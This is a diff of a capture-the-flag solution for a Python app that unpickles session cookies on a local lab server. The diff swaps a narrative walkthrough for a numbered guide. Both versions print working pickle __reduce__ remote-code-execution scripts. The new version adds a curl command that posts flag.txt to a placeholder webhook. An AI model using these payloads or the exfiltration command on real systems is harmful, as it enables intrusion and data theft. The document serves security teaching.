@@ -1,111 +1,42 @@
-# Cookie 4: The Pythonic Revenge - Solution
+1. **Understand the vulnerability**: This challenge uses Python's `pickle` module to deserialize session cookies. Pickle deserialization is dangerous because it can execute arbitrary code when deserializing malicious objects.
 
-This document outlines the steps to solve the "Cookie 4" CTF challenge.
+2. **Create a malicious pickle object**: Create a Python class that uses the `__reduce__` method to execute a command when unpickled. The `__reduce__` method should return a tuple containing a callable (like `os.system`) and its arguments.
 
-## 1. Initial Reconnaissance
+   ```python
+   import pickle
+   import base64
+   import os
 
-First, we start the challenge by running `docker-compose up cookie4`. Navigating to the challenge URL (e.g., `http://localhost:5004`), we are presented with a new login page for "The Vault - Final Fortress". It seems our previous intrusions have led them to upgrade their systems.
+   class RCE:
+       def __reduce__(self):
+           # Command to exfiltrate the flag
+           cmd = 'curl -X POST --data-binary @flag.txt https://your-webhook-url'
+           return (os.system, (cmd,))
+   ```
 
-## 2. Analyzing the Session Cookie
+3. **Craft the payload**: The payload should execute a command that exfiltrates the flag. You can use `curl` to send the flag to a webhook service like webhook.site, or use other methods to retrieve the flag.
 
-Just like in the previous challenges, let's inspect the cookies. We find a `session` cookie. The value appears to be Base64 encoded.
+4. **Serialize and encode**: Use `pickle.dumps()` to serialize your malicious object, then base64 encode it to make it suitable for use as a cookie value.
 
-Let's decode it:
+   ```python
+   # Serialize the malicious object
+   pickled = pickle.dumps(RCE())
 
-```bash
-echo "YOUR_COOKIE_VALUE" | base64 -d
-```
+   # Base64 encode for use as a cookie
+   encoded_pickle = base64.b64encode(pickled).decode('utf-8')
+   ```
 
-The output looks like gibberish, which is a strong hint that it's a serialized object, not just a simple string. Given the challenge is now in Python, this is likely a `pickle` string.
+5. **Set the malicious cookie**: Replace the `session` cookie with your base64-encoded malicious pickle object. You can do this programmatically using requests or manually through browser developer tools.
 
-## 3. The Vulnerability: Unsafe Pickle Deserialization
+   ```python
+   import requests
 
-Pickle is a Python library for serializing and deserializing Python objects. Deserializing user-controlled data with `pickle` is extremely dangerous because it can be tricked into executing arbitrary code. This is our entry point.
+   cookies = {'session': encoded_pickle}
+   response = requests.get('http://localhost:5004', cookies=cookies)
+   ```
 
-## 4. Crafting the Exploit
+6. **Trigger the deserialization**: Make a request to the server. When the server tries to deserialize your malicious session cookie, it will execute your payload.
 
-We need to create a malicious pickled object that, when deserialized by the server, will execute a command of our choosing. We can achieve this by creating a Python class with a `__reduce__` method. The `__reduce__` method tells `pickle` how to reconstruct the object, and we can abuse it to run system commands.
+7. **Retrieve the flag**: Check your webhook or wherever you sent the flag data to retrieve the flag.
 
-Here is the plan for our exploit script:
-1.  Create a Python class that, when unpickled, executes a command.
-2.  The `__reduce__` method of this class will return `(os.system, ('your_command_here',))`.
-3.  We'll start with a simple command like `ls -la` to see what's in the current directory.
-4.  Pickle an instance of this class.
-5.  Base64 encode the pickled object.
-6.  Send a request to the server with our malicious `session` cookie.
-
-## 5. The Exploit Script
-
-Here is a Python script to automate the process:
-
-```python
-import pickle
-import base64
-import requests
-import os
-
-class RCE:
-    def __reduce__(self):
-        # Command to be executed on the server
-        cmd = 'ls -la' 
-        return (os.system, (cmd,))
-
-# Create an instance of our RCE class
-pickled = pickle.dumps(RCE())
-
-# Base64 encode the pickled object
-encoded_pickle = base64.b64encode(pickled).decode('utf-8')
-
-# The URL of the challenge
-url = 'http://localhost:5004' # Change port if necessary
-
-# Set the malicious cookie
-cookies = {'session': encoded_pickle}
-
-# Send the request
-response = requests.get(url, cookies=cookies)
-
-# Print the server's response
-print(response.text)
-```
-
-Running this script, we should see the output of `ls -la` from the server's current directory in the response HTML.
-
-## 6. Getting the Flag
-
-Now that we have RCE, we can look for the flag. After running `ls -la`, we'll likely see a `flag.txt` file in the output.
-
-Let's modify our exploit script to read the flag:
-
-```python
-import pickle
-import base64
-import requests
-import os
-
-class RCE:
-    def __reduce__(self):
-        # Command to read the flag
-        cmd = 'cat flag.txt' 
-        return (os.system, (cmd,))
-
-# Create an instance of our RCE class
-pickled = pickle.dumps(RCE())
-
-# Base64 encode the pickled object
-encoded_pickle = base64.b64encode(pickled).decode('utf-8')
-
-# The URL of the challenge
-url = 'http://localhost:5004' # Change port if necessary
-
-# Set the malicious cookie
-cookies = {'session': encoded_pickle}
-
-# Send the request
-response = requests.get(url, cookies=cookies)
-
-# Print the server's response, which should contain the flag
-print(response.text)
-```
-
-Running the updated script will print the page content, which will now include the flag. The challenge is solved!
+**Key concept**: Never trust user input, especially when using dangerous deserialization methods like pickle. Always validate and sanitize data, and consider using safer alternatives like JSON for session data.
